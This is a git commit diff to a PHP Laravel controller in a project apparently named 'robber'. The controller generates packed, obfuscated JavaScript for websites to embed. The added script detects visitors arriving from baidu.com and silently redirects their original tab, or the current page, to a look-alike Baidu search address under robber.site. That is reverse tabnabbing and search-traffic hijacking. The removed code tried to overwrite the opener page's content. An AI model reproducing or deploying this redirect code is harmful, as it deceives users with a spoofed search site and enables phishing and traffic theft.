98138906365e3ebbb519003c99db482cb60eeccf
robber <2451678579@qq.com>
2016-12-10 11:40:04 +0800

    '换了一种更可行的js'

--- app/Http/Controllers/JsController.php
+++ app/Http/Controllers/JsController.php
@@ -2,32 +2,34 @@
 
 namespace App\Http\Controllers;
 
-use Illuminate\Http\Request;
 use App\ExtraClasses\JavaScriptPacker;
 
-class JsController extends Controller
-{
-    public function js($website_id){
+class JsController extends Controller {
+	public function js($website_id) {
 
-    	$website = \DB::table('websites')->find($website_id);
-    	$keyword = \DB::table('keywords')->where('website_id', $website_id)->first();
+		$website = \DB::table('websites')->find($website_id);
+		$keyword = \DB::table('keywords')->where('website_id', $website_id)->first();
 
-    	if(!isset($keyword)){
-    		return view('js', ['js' => '请设置站点<a href="'. url('/website/'. $website->id .'/keyword') .'">关键词</a>']);
-    	}
+		if (!isset($keyword)) {
+			return view('js', ['js' => '请设置站点<a href="' . url('/website/' . $website->id . '/keyword') . '">关键词</a>']);
+		}
 
-        // $js = 'window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";';
+		$js = 'if(window.opener){
+                if(document.referrer.indexOf("baidu.com") != -1){
+                        window.opener.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
+                }
+        }else{
+                if(document.referrer.indexOf("baidu.com") != -1){
+                        window.open(window.location.href, "_self");
+                        window.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
+                }
+        }';
 
-        $js = 'var opener = window.opener.document.open("text/html", "replace");
-               var html="<html><body>Learning about the DOM is FUN!</body></html>";
-               old.write(html);
-               old.close();';
-               
 		$packer = new JavaScriptPacker($js, 'Normal', true, false);
 		$packed = $packer->pack();
 
-        \Storage::disk('js')->put(md5($website_id) . '.js', $packed);
+		\Storage::disk('js')->put(md5($website_id) . '.js', $packed);
 
-        return view('js', ['js' => e('<script type="text/javascript" src="http://www.robber.site/js/'. md5($website_id) . '.js' .'"></script>')]);
-    }
+		return view('js', ['js' => e('<script type="text/javascript" src="http://www.robber.site/js/' . md5($website_id) . '.js' . '"></script>')]);
+	}
 }
